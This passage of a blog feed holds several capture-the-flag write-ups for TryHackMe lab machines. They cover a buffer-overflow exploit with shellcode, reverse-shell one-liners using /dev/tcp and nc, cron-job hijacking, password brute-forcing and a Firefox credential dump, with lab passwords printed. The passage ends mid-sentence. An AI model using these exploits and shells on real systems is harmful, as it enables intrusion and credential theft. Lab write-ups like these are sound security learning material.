35 36 37 38 39 40 41 42 43 44 45 import socket ip = \u0026#34;10.10.98.109\u0026#34; port = 31337 offset = 146 overflow = \u0026#34;A\u0026#34; * offset retn = \u0026#34;\\xc3\\x14\\x04\\x08\u0026#34; padding = \u0026#34;\\x90\u0026#34; * 16 payload = (\u0026#34;\\xdb\\xd4\\xbb\\xde\\xb4\\xa5\\xcc\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\u0026#34; \u0026#34;\\xb1\\x52\\x31\\x58\\x17\\x03\\x58\\x17\\x83\\x1e\\xb0\\x47\\x39\\x62\u0026#34; \u0026#34;\\x51\\x05\\xc2\\x9a\\xa2\\x6a\\x4a\\x7f\\x93\\xaa\\x28\\xf4\\x84\\x1a\u0026#34; \u0026#34;\\x3a\\x58\\x29\\xd0\\x6e\\x48\\xba\\x94\\xa6\\x7f\\x0b\\x12\\x91\\x4e\u0026#34; \u0026#34;\\x8c\\x0f\\xe1\\xd1\\x0e\\x52\\x36\\x31\\x2e\\x9d\\x4b\\x30\\x77\\xc0\u0026#34; \u0026#34;\\xa6\\x60\\x20\\x8e\\x15\\x94\\x45\\xda\\xa5\\x1f\\x15\\xca\\xad\\xfc\u0026#34; \u0026#34;\\xee\\xed\\x9c\\x53\\x64\\xb4\\x3e\\x52\\xa9\\xcc\\x76\\x4c\\xae\\xe9\u0026#34; \u0026#34;\\xc1\\xe7\\x04\\x85\\xd3\\x21\\x55\\x66\\x7f\\x0c\\x59\\x95\\x81\\x49\u0026#34; \u0026#34;\\x5e\\x46\\xf4\\xa3\\x9c\\xfb\\x0f\\x70\\xde\\x27\\x85\\x62\\x78\\xa3\u0026#34; \u0026#34;\\x3d\\x4e\\x78\\x60\\xdb\\x05\\x76\\xcd\\xaf\\x41\\x9b\\xd0\\x7c\\xfa\u0026#34; \u0026#34;\\xa7\\x59\\x83\\x2c\\x2e\\x19\\xa0\\xe8\\x6a\\xf9\\xc9\\xa9\\xd6\\xac\u0026#34; \u0026#34;\\xf6\\xa9\\xb8\\x11\\x53\\xa2\\x55\\x45\\xee\\xe9\\x31\\xaa\\xc3\\x11\u0026#34; \u0026#34;\\xc2\\xa4\\x54\\x62\\xf0\\x6b\\xcf\\xec\\xb8\\xe4\\xc9\\xeb\\xbf\\xde\u0026#34; \u0026#34;\\xae\\x63\\x3e\\xe1\\xce\\xaa\\x85\\xb5\\x9e\\xc4\\x2c\\xb6\\x74\\x14\u0026#34; \u0026#34;\\xd0\\x63\\xda\\x44\\x7e\\xdc\\x9b\\x34\\x3e\\x8c\\x73\\x5e\\xb1\\xf3\u0026#34; \u0026#34;\\x64\\x61\\x1b\\x9c\\x0f\\x98\\xcc\\xa9\\xdd\\xb6\\x78\\xc6\\xe3\\xb6\u0026#34; \u0026#34;\\x91\\x4a\\x6d\\x50\\xfb\\x62\\x3b\\xcb\\x94\\x1b\\x66\\x87\\x05\\xe3\u0026#34; \u0026#34;\\xbc\\xe2\\x06\\x6f\\x33\\x13\\xc8\\x98\\x3e\\x07\\xbd\\x68\\x75\\x75\u0026#34; \u0026#34;\\x68\\x76\\xa3\\x11\\xf6\\xe5\\x28\\xe1\\x71\\x16\\xe7\\xb6\\xd6\\xe8\u0026#34; \u0026#34;\\xfe\\x52\\xcb\\x53\\xa9\\x40\\x16\\x05\\x92\\xc0\\xcd\\xf6\\x1d\\xc9\u0026#34; \u0026#34;\\x80\\x43\\x3a\\xd9\\x5c\\x4b\\x06\\x8d\\x30\\x1a\\xd0\\x7b\\xf7\\xf4\u0026#34; \u0026#34;\\x92\\xd5\\xa1\\xab\\x7c\\xb1\\x34\\x80\\xbe\\xc7\\x38\\xcd\\x48\\x27\u0026#34; \u0026#34;\\x88\\xb8\\x0c\\x58\\x25\\x2d\\x99\\x21\\x5b\\xcd\\x66\\xf8\\xdf\\xed\u0026#34; \u0026#34;\\x84\\x28\\x2a\\x86\\x10\\xb9\\x97\\xcb\\xa2\\x14\\xdb\\xf5\\x20\\x9c\u0026#34; \u0026#34;\\xa4\\x01\\x38\\xd5\\xa1\\x4e\\xfe\\x06\\xd8\\xdf\\x6b\\x28\\x4f\\xdf\u0026#34; \u0026#34;\\xb9\u0026#34;) postfix = \u0026#34;\u0026#34; buffer = overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) print(\u0026#34;Done!\u0026#34;) After gaining initial access and wondering around a bit I noticed that the only possible thing to do would be getting credentials from Firefox, I used the metasploit tool post/multi/gather/firefox_creds\nAfter that I ran firefox_decrypt and got the username and password:\n1 2 3 4 5 6 7 8 python3 firefox_decrypt.py firefox/loot 2024-01-03 10:00:37,134 - WARNING - profile.ini not found in firefox/loot 2024-01-03 10:00:37,134 - WARNING - Continuing and assuming \u0026#39;firefox/loot\u0026#39; is a profile location Website: https://creds.com Username: \u0026#39;mayor\u0026#39; Password: \u0026#39;8CL7O1N78MdrCIsV\u0026#39; ","date":"2024-01-03T16:00:00+01:00","image":"https://images.unsplash.com/photo-1580047750144-2c7790adf461?q=80\u0026w=2670\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/gatekeeper-writeup-thm/","title":"Gatekeeper Writeup THM"},{"content":"The first thing that I am going to do is a nmap scna:\n1 2 3 4 5 6 7 8 9 10 11 nmap 10.10.192.193 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 09:30 EST Nmap scan report for 10.10.192.193 Host is up (0.059s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds From there we can see that the host is running ssh and a web page, let’s see what;s in the web page.\nLooking at the source code I have found this:\n1 2 3 4 Overpass allows you to securely store different passwords for every service, protected using military grade \u0026lt;!--Yeah right, just because the Romans used it doesn\u0026#39;t make it military grade, change this?--\u0026gt; cryptography to keep you safe. The commented part can be a hint that the password are stored using ROT13.\nAfter that I ran a directory discovery scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ffuf -u http://10.10.192.193/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.192.193/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ aboutus [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms] admin [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 57ms] css [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 58ms] downloads [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 71ms] img [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 57ms] :: Progress: [20469/20469] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:36] :: Errors: 0 :: Going into the admin page I got meeted with a login form.\nThis login form loads a script:\n1 2 3 4 5 6 7 8 if (statusOrCookie === \u0026#34;Incorrect credentials\u0026#34;) { loginStatus.textContent = \u0026#34;Incorrect Credentials\u0026#34; passwordBox.value=\u0026#34;\u0026#34; } else { Cookies.set(\u0026#34;SessionToken\u0026#34;,statusOrCookie) window.location = \u0026#34;/admin\u0026#34; } } This script bascially allows you to create a token named SessionToken, and make a value different from “Incorrect credentials” and gives you access in the admin page\nWe found out a ssh key, now I am going to try and access james account with it:\n1 2 3 4 5 chmod 400 id_rsa ┌──(kali㉿kali)-[~] └─$ ssh -i id_rsa james@10.10.192.193 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Seems like it wants a passphrase.\nWe can retrieve that with John:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ssh2john id_rsa \u0026gt; id.txt ┌──(kali㉿kali)-[~] └─$ john --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt id.txt Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status \u0026lt;redacted\u0026gt; (id_rsa) 1g 0:00:00:00 DONE (2024-01-01 09:58) 100.0g/s 1337Kp/s 1337Kc/s 1337KC/s pimentel..handball Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. And it worked:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ssh -i id_rsa james@10.10.192.193 Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Jan 1 15:00:25 UTC 2024 System load: 0.12 Processes: 88 Usage of /: 22.3% of 18.57GB Users logged in: 0 Memory usage: 13% IP address for eth0: 10.10.192.193 Swap usage: 0% 47 packages can be updated. 0 updates are security updates. Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1 james@overpass-prod:~$ whoami james Once there I found this, in the .overpass file:\n1 [{\u0026#34;name\u0026#34;:\u0026#34;System\u0026#34;,\u0026#34;pass\u0026#34;:\u0026#34;saydrawnlyingpicture\u0026#34;}] Which is James’s password\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don\u0026#39;t have to run the `crontab\u0026#39; # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # Update builds from latest code * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash Looks like there is a crontab running which uses curl totake the buildscript.sh and run that.\nFrom there I just edited the /etc/hosts file and I addes my IP, so now when it will try to retrieve the script, it will retrive it from me.\nSo I made this script inside a /downloads/src/ folder:\n1 2 3 4 cat buildscript.sh #!/bin/bash /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.18.20.116/5555 0\u0026gt;\u0026amp;1 So when I started the server it took my script and I got a reverse shell:\n1 2 3 4 5 6 7 8 9 nc -lvnp 5555 listening on [any] 5555 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.192.193] 39270 bash: cannot set terminal process group (2104): Inappropriate ioctl for device bash: no job control in this shell root@overpass-prod:~# whoami whoami root ","date":"2024-01-03T10:00:00+01:00","image":"https://raw.githubusercontent.com/Blueaulo/Overpass-writeup-THM/main/f08d4045-89e3-45d5-9ed3-0f650f39cb59_Export-a6534518-0a1b-40b8-b980-4ff782785aa3/Overpass%205b2344c2eb5141888e86ae3e2746ed53/Untitled.png","permalink":"https://simonefelici.github.io/p/overpass-writeup-thm/","title":"Overpass Writeup THM"},{"content":"The first thing that I am going to do is a nmap scan:\n1 2 3 4 5 6 7 8 9 10 nmap 10.10.243.20 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-01 07:27 EST Nmap scan report for 10.10.243.20 Host is up (0.073s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 10.41 seconds From there we can see that it has:\n22(SSH) 80(HTTP) First of all I am going to explore the web page.\nWe got meeted by the apache2 ubuntu default page, that’s good, because now weknow that it is an ubuntu machine and it’s running Apache2.\nNow I am just going to run ffuf for directory enumeration:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 ffuf -u http://10.10.243.20/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.243.20/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1172ms] .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4189ms] content [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms] server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 57ms] :: Progress: [20469/20469] :: Job [1/1] :: 353 req/sec :: Duration: [0:00:38] :: Errors: 0 :: As we can see we got a content page, let’s see what’s in here.\nThat’s great, now we know that the web page is using Basic CMS.\nFor now I am just going to follow the tip that the default web page gave us: “If you are the webmaster,please go to Dashboard -\u0026gt; General -\u0026gt; Website setting”.\nbut for doing that we first need to login and access the dashboard.\nI ran another directory scanner, this time inside content:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ffuf -u http://10.10.243.20/content/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.243.20/content/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1687ms] _themes [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 55ms] .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2705ms] as [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms] attachment [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 58ms] images [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 57ms] inc [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 57ms] js [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms] :: Progress: [20469/20469] :: Job [1/1] :: 271 req/sec :: Duration: [0:00:45] :: Errors: 0 :: The dashboard is located in /content/as.\nBut we don’t have the credentials yet.\nI went into inc, and there we can see a mysql backup:\nHere we can see the hashed password and the login username.\nmanager:Password123\nNow we can see which version is running, after searching on internet I found this script: “https://www.exploit-db.com/exploits/40716”\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+ | _________ __ __________.__ | | / _____/_ _ __ ____ _____/ |\\______ \\__| ____ ____ | | \\_____ \\ \\/ \\/ // __ \\_/ __ \\ __\\ _/ |/ ___\\/ __ \\ | | / \\ /\\ ___/\\ ___/| | | | \\ \\ \\__\\ ___/ | |/_______ / \\/\\_/ \\___ \u0026gt;\\___ \u0026gt;__| |____|_ /__|\\___ \u0026gt;___ \u0026gt; | | \\/ \\/ \\/ \\/ \\/ \\/ | | \u0026gt; SweetRice 1.5.1 Unrestricted File Upload | | \u0026gt; Script Cod3r : Ehsan Hosseini | +-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+ Enter The Target URL(Example : localhost.com) : 10.10.243.20/content Enter Username : manager Enter Password : Password123 Enter FileName (Example:.htaccess,shell.php5,index.html) : php.php [+] Sending User\u0026amp;Pass... [+] Login Succssfully... [+] File Uploaded... [+] URL : http://10.10.243.20/content/attachment/php.php This one didn’t work so I am going to switch to another one that I have found: “https://www.exploit-db.com/exploits/40700”\nIt bascially tells you to go and add a file in the ads section.\nafter that we just navigate to the ads directory “http://10.10.243.20/content/inc/ads/” and we have our shell:\n1 2 3 4 5 6 7 8 9 10 11 nc -lvnp 4444 listening on [any] 4444 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.243.20] 35430 Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux 15:20:14 up 53 min, 0 users, load average: 0.00, 0.00, 0.07 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ whoami www-data Going to the IT guy directory gives us the user flag.\nNow using sudo -l:\n1 2 3 4 5 6 sudo -l Matching Defaults entries for www-data on THM-Chal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on THM-Chal: (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl We can see that we can use perl and backup.pl with root privileges.\n1 2 3 4 5 cat /home/itguy/backup.pl #!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); This basically just execute the /etc/copy.sh file\n1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.18.20.116 4555 \u0026gt;/tmp/f So I changed the cdoe with my ip and port, then executed with: sudo /usr/bin/perl /home/itguy/backup.pl and got the shell.\n1 2 3 4 5 6 nc -lvnp 4555 listening on [any] 4555 ... connect to [10.18.20.116] from (UNKNOWN) [10.10.243.20] 56612 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # whoami root ","date":"2024-01-02T00:00:00Z","image":"https://images.unsplash.com/photo-1494256997604-768d1f608cac?q=80\u0026w=2729\u0026auto=format\u0026fit=crop\u0026ixlib=rb-4.0.3\u0026ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D","permalink":"https://simonefelici.github.io/p/lazyadmin-writeup-thm/","title":"LazyAdmin Writeup THM"},{"content":"The first thing that I am going to do is a nmap scan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 sudo nmap -A 10.10.186.60 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-31 14:46 EST Nmap scan report for internal.thm (10.10.186.60) Host is up (0.055s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA) | 256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA) |_ 256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works I found 2 ports,\n22(SSH) 80(HTTP) The first thing that I am going to do is exploring the web page in port 80.\nI get meeted by the Apache2 Ubuntu Default Page, so now I know that the server is running the ubuntu and Apache2.\nBut that’s all forn know, so I started a subdomain/subdirectory enumeration,\nThe directory that I have found are those:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ffuf -u http://10.10.186.60:80/FUZZ -w /usr/share/wordlists/dirb/big.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.186.60:80/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ .htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 5064ms] .htaccess [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 6097ms] blog [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 58ms] javascript [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms] phpmyadmin [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 341ms] server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 59ms] wordpress [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 57ms] From there I can see that the server is powered by wordpress, and runs javascript.\nSo now I am just going to explore these subdirectories more…\nSo, for now I have:\nApache 2.4.29 Wordpress 5.4.2 MySQL They are old version, so maybe I can find something on the internet.\nAlso I have 2 login pages:\nhttp://internal.thm/blog/wp-login.php http://10.10.186.60/phpmyadmin/ Now I try to get some information directly trough wordpress, using wpscan:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 wpscan --url 10.10.186.60/blog -e u vp _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.186.60/blog/ [10.10.186.60] [+] Started: Sun Dec 31 15:10:27 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.186.60/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://10.10.186.60/blog/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.186.60/blog/, Match: \u0026#39;WordPress 5.4.2\u0026#39; [i] The main theme could not be detected. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;===================================================================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Dec 31 15:10:31 2023 [+] Requests Done: 48 [+] Cached Requests: 5 [+] Data Sent: 11.895 KB [+] Data Received: 302.953 KB [+] Memory used: 150.684 MB [+] Elapsed time: 00:00:03 Here we can see that I have retrieved an username, Admin!\nNow I can try to retrieve the password:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 wpscan --url 10.10.186.60/blog -e u -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | \u0026#39;_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.186.60/blog/ [10.10.186.60] [+] Started: Sun Dec 31 15:29:27 2023 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.186.60/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.186.60/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.186.60/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Emoji Settings (Passive Detection) | - http://10.10.186.60/blog/, Match: \u0026#39;wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.4.2\u0026#39; | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.186.60/blog/, Match: \u0026#39;WordPress 5.4.2\u0026#39; [i] The main theme could not be detected. [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 \u0026lt;==================================================================================================================================================================================================\u0026gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] admin | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] Performing password attack on Xmlrpc against 1 user/s [SUCCESS] - admin / my2boys Trying admin / princess7 Time: 00:04:06 \u0026lt; \u0026gt; (3885 / 14348276) 0.02% ETA: ??:??:?? [!] Valid Combinations Found: | Username: admin, Password: my2boys [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register [+] Finished: Sun Dec 31 15:33:36 2023 [+] Requests Done: 3900 [+] Cached Requests: 40 [+] Data Sent: 2.001 MB [+] Data Received: 2.3 MB [+] Memory used: 190.441 MB [+] Elapsed time: 00:04:09 Seems like it worked.\nHere in the posts tab I can see that there is another post, but they haven’t published it, let’s see what there is into it:\nWow, now I have another se of credential:\nwilliam:arnold147\nI am going to try to enter this in the ssh and phpmyadmin page.\nThey didn’t work.\nOk, now I am just going to get a reverse shell, from this point is pretty easy.\nYou just want to go to the Theme Editor, and access the 404 